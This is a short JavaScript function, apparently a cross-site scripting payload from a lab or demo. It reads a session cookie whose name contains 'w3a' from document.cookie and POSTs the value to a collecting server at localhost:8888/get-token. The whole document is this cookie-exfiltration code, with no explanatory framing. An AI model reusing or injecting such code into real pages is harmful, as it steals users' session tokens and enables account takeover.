var sendMyTokenBecauseIamDumb = () => {
  fetch("http://localhost:8888/get-token", {
    method: "post",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      token: document.cookie
        .split(";")
        .find((t) => t.includes("w3a"))
        ?.split("=")[1],
    }),
  });
};
